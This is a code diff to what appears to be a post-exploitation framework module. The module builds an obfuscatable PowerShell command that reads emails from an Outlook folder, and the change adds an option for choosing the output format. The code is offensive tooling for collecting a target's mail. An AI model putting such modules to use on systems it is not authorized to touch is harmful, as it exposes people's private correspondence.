@@ -48,6 +48,11 @@ class Module(object):
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'OutputFunction' : {
+                'Description'   :   'PowerShell\'s output function to use ("Out-String", "ConvertTo-Json", "ConvertTo-Csv", "ConvertTo-Html", "ConvertTo-Xml").',
+                'Required'      :   False,
+                'Value'         :   'Out-String'
+            },
             'FolderName' : {
                 'Description'   :   'The Name of the Outlook Default Folder.',
                 'Required'      :   True,
@@ -95,7 +100,8 @@ class Module(object):
 
         scriptEnd = "Get-OutlookFolder -Name '%s' | Get-EmailItems -MaxEmails %s" %(folderName, maxEmails)
 
-        scriptEnd += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
+        outputf = self.options["OutputFunction"]["Value"]
+        scriptEnd += " | {outputf} | ".format(outputf=outputf) + '%{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
 
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
